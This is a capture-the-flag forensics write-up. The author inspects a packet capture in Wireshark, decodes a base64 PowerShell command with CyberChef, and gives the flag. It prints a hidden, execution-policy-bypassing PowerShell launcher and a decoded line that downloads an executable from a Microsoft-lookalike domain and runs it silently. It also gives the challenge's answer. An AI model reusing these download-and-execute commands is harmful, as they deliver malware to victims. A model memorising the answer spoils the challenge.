Challenge Description

This should be easy. Keep your eyes open — there’s something for the last challenge! reCAPTCHA???
Flag Format: CM{FullSusUrl_NameOfTheMaliciousFileOnTheSystem}
Author: sn0_0wyy

We are provided with a single file:
Warmup.pcapng 
I opened the capture in Wireshark.

Since the challenge flag format includes the name of the malicious file, I searched the capture for any executable transferred over HTTP.

To do this, I applied the following Wireshark filter: frame contains ".exe"
After locating the HTTP request tied to the malicious .exe file, I selected the packet and clicked: Right‑click → Follow → HTTP Stream
Inside the stream, instead of a direct executable or plaintext script, I found a suspicious PowerShell command being delivered to the victim machine:

powershell -w hidden -ep bypass -nop -EncodedCommand SQBFAHgAKABbAFQAZ...

This is a classic sign of malware delivery. The attacker used:
-w hidden → hides the PowerShell window
-ep bypass → bypasses execution policy
-nop → no PowerShell profile
-EncodedCommand → runs a Base64‑encoded payload
After extracting the Base64-encoded PowerShell command from the HTTP stream, I decoded it using CyberChef.
until readable PowerShell appeared.
The final decoded command was:

IWR https://update.rnicrosoft.com/DooM.exe -OutFile $env:TEMP\B4ng3R.exe;
Start-Process $env:TEMP\B4ng3R.exe -WindowStyle Hidden
#R29vZCBsdWNrIG9uIHRoZSBuZXh0IG9uZSEhIE5vdGUgdGhpcyBhZG1pbjowMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMA==
According to the flag format:

CM{FullSusUrl_NameOfTheMaliciousFileOnTheSystem}
We must retrieve:
Malicious URL: https://update.rnicrosoft.com/DooM.exe
Malicious file written on disk:B4ng3R.exe
Both appear clearly in the decoded command.
Putting the two components together:

CM{https://update.rnicrosoft.com/DooM.exe_B4ng3R.exe}